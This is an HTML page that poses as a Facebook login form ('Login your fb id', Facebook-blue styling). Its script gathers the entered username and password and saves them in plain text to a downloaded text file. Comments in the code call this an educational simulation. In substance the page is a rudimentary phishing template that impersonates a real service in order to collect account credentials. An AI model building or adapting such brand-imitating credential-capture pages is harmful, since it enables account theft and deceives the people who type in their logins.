<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login face book</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        #login-container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        #login-form {
            display: flex;
            flex-direction: column;
        }

        label {
            margin-bottom: 8px;
        }

        input {
            padding: 10px;
            margin-bottom: 16px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        button {
            padding: 10px;
            background-color: #3b5998;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div id="login-container">
        <h2>Login your fb id</h2>
        <form id="login-form">
            <label for="username">fb Username:</label>
            <input type="text" id="username" name="username" required>

            <label for="password">fb Password:</label>
            <input type="password" id="password" name="password" required>

            <button type="button" onclick="login()">Login</button>
        </form>
    </div>

    <script>
        function login() {
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;

            // Simulating a server-side process (for educational purposes only)
            // In a real application, you would send this data to the server securely.

            // WARNING: This is a security risk and should not be done in a real application.
            // Passwords should NEVER be stored in plain text.

            var credentialsText = 'Username: ' + username + '\nPassword: ' + password;

            // Create a Blob with the text data.
            var blob = new Blob([credentialsText], { type: 'text/plain' });

            // Create a link element to trigger the download.
            var a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = 'new folder/new text document.txt';

            // Append the link to the body and trigger the click event.
            document.body.appendChild(a);
            a.click();

            // Remove the link from the body.
            document.body.removeChild(a);
        }
    </script>
</body>
</html>
